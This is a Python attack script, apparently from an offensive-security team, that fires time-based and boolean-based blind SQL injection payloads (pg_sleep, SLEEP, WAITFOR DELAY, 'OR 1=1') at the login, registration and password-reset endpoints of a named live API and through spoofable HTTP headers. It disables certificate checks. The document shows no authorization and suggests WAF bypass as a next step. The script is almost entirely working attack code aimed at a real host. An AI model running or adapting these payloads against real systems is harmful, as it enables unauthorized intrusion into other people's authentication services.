#!/usr/bin/env python3
"""
Manual Blind SQL Injection Testing (Time-Based & Boolean-Based)
Target: REDAHUB API
Author: Neural-OffSec-Team
"""

import requests
import time
import urllib.parse


TARGET_BASE = "https://bkd.redahub.cloud/api"
VERIFY_SSL = False
TIME_THRESHOLD = 5  # segundos


class BlindSQLInjectionTester:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = VERIFY_SSL
        self.vulnerable_endpoints = []

    def test_time_based(self, url: str, param: str, payload_template: str) -> bool:
        """Testa time-based blind SQL injection"""
        # Payloads time-based para diferentes DBs
        payloads = [
            # PostgreSQL (Django default)
            f"' OR pg_sleep({TIME_THRESHOLD})--",
            f"1' AND pg_sleep({TIME_THRESHOLD})--",
            f"admin' OR pg_sleep({TIME_THRESHOLD})--",
            # MySQL
            f"' OR SLEEP({TIME_THRESHOLD})--",
            f"1' AND SLEEP({TIME_THRESHOLD})--",
            # SQLite
            f"' OR (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3))>{TIME_THRESHOLD}--",
            # MS SQL
            f"'; WAITFOR DELAY '00:00:0{TIME_THRESHOLD}'--",
        ]

        for payload in payloads:
            data = {param: payload}
            print(f"  [*] Payload: {payload[:50]}...", end=" ")

            start_time = time.time()
            try:
                self.session.post(url, json=data, timeout=TIME_THRESHOLD + 5)
                elapsed = time.time() - start_time

                if elapsed >= TIME_THRESHOLD:
                    print(f"‚úÖ VULN! ({elapsed:.2f}s)")
                    return True
                else:
                    print(f"‚ùå ({elapsed:.2f}s)")
            except requests.Timeout:
                print(f"‚è±Ô∏è  TIMEOUT (prov√°vel VULN!)")
                return True
            except Exception as e:
                print(f"‚ùå Erro: {e}")

        return False

    def test_boolean_based(self, url: str, param: str) -> bool:
        """Testa boolean-based blind SQL injection"""
        # Payloads que devem retornar TRUE
        true_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin' OR '1'='1'--",
            "' OR 'x'='x",
        ]

        # Payloads que devem retornar FALSE
        false_payloads = [
            "' OR '1'='2",
            "' OR 1=0--",
            "admin' OR '1'='2'--",
            "' OR 'x'='y",
        ]

        print(f"\n  [*] Testando Boolean-Based SQLi...")

        # Baseline (request normal)
        baseline_data = {param: "test@test.com"}
        baseline_resp = self.session.post(url, json=baseline_data)
        baseline_length = len(baseline_resp.text)

        # Testar TRUE payloads
        true_lengths = []
        for payload in true_payloads:
            data = {param: payload}
            resp = self.session.post(url, json=data)
            true_lengths.append(len(resp.text))

        # Testar FALSE payloads
        false_lengths = []
        for payload in false_payloads:
            data = {param: payload}
            resp = self.session.post(url, json=data)
            false_lengths.append(len(resp.text))

        # An√°lise: TRUE e FALSE devem ter tamanhos diferentes
        avg_true = sum(true_lengths) / len(true_lengths)
        avg_false = sum(false_lengths) / len(false_lengths)
        diff = abs(avg_true - avg_false)

        print(f"    Baseline length: {baseline_length}")
        print(f"    TRUE payloads avg: {avg_true:.0f}")
        print(f"    FALSE payloads avg: {avg_false:.0f}")
        print(f"    Diferen√ßa: {diff:.0f}")

        if diff > 50:  # Threshold: diferen√ßa significativa
            print(f"    ‚úÖ POSS√çVEL VULN (diferen√ßa {diff:.0f} bytes)")
            return True
        else:
            print(f"    ‚ùå Sem diferen√ßa significativa")
            return False

    def test_header_injection(self, url: str) -> None:
        """Testa SQL injection em headers"""
        print(f"\n[*] Testando SQLi em Headers...")

        headers_to_test = [
            "User-Agent",
            "X-Forwarded-For",
            "X-Real-IP",
            "Referer",
            "X-Originating-IP",
            "X-Remote-IP",
            "X-Client-IP",
        ]

        payload = f"' OR pg_sleep({TIME_THRESHOLD})--"

        for header in headers_to_test:
            print(f"  [*] Header: {header}...", end=" ")
            headers = {header: payload}

            start_time = time.time()
            try:
                self.session.get(url, headers=headers, timeout=TIME_THRESHOLD + 5)
                elapsed = time.time() - start_time

                if elapsed >= TIME_THRESHOLD:
                    print(f"‚úÖ VULN! ({elapsed:.2f}s)")
                else:
                    print(f"‚ùå ({elapsed:.2f}s)")
            except requests.Timeout:
                print(f"‚è±Ô∏è  TIMEOUT (prov√°vel VULN!)")
            except Exception as e:
                print(f"‚ùå Erro: {e}")

    def run_comprehensive_tests(self):
        """Executa bateria completa de testes"""
        print("[*] Manual Blind SQL Injection Testing")
        print("[*] Target: REDAHUB API")
        print("=" * 70)

        # Endpoints a testar
        endpoints = [
            {
                "url": f"{TARGET_BASE}/auth/login/",
                "params": ["email", "password"],
                "method": "POST",
            },
            {
                "url": f"{TARGET_BASE}/auth/register/",
                "params": ["email", "username", "password"],
                "method": "POST",
            },
            {
                "url": f"{TARGET_BASE}/auth/reset-password/",
                "params": ["email"],
                "method": "POST",
            },
        ]

        for endpoint in endpoints:
            print(f"\n[+] Testando: {endpoint['url']}")
            print("-" * 70)

            for param in endpoint["params"]:
                print(f"\n  [Par√¢metro: {param}]")

                # Time-based
                print(f"  [*] Time-Based SQLi:")
                is_vuln_time = self.test_time_based(
                    endpoint["url"], param, f"'{param}"
                )

                # Boolean-based
                is_vuln_bool = self.test_boolean_based(endpoint["url"], param)

                if is_vuln_time or is_vuln_bool:
                    self.vulnerable_endpoints.append(
                        {
                            "url": endpoint["url"],
                            "param": param,
                            "type": "time-based" if is_vuln_time else "boolean-based",
                        }
                    )

            # Headers
            self.test_header_injection(endpoint["url"])

        # Relat√≥rio final
        print("\n" + "=" * 70)
        print("[*] RESUMO FINAL")
        print("=" * 70)

        if self.vulnerable_endpoints:
            print(f"\nüö® VULNERABILIDADES ENCONTRADAS: {len(self.vulnerable_endpoints)}")
            for vuln in self.vulnerable_endpoints:
                print(f"\n  [!] {vuln['url']}")
                print(f"      Par√¢metro: {vuln['param']}")
                print(f"      Tipo: {vuln['type']}")
        else:
            print("\n‚úÖ Nenhuma vulnerabilidade SQL Injection detectada")
            print("   Poss√≠veis raz√µes:")
            print("   - Django usando ORM com queries parametrizadas")
            print("   - Input sanitization adequada")
            print("   - WAF bloqueando payloads")

        # Recomenda√ß√µes para testes manuais adicionais
        print("\n[+] Testes adicionais recomendados:")
        print("    1. Testar SQLi em outros endpoints (search, filter, etc)")
        print("    2. Testar second-order SQL injection")
        print("    3. Testar SQLi em cookies")
        print("    4. Fuzzing com charset completo")
        print("    5. Testar WAF bypass (encoding, obfuscation)")


if __name__ == "__main__":
    import urllib3

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    tester = BlindSQLInjectionTester()
    tester.run_comprehensive_tests()
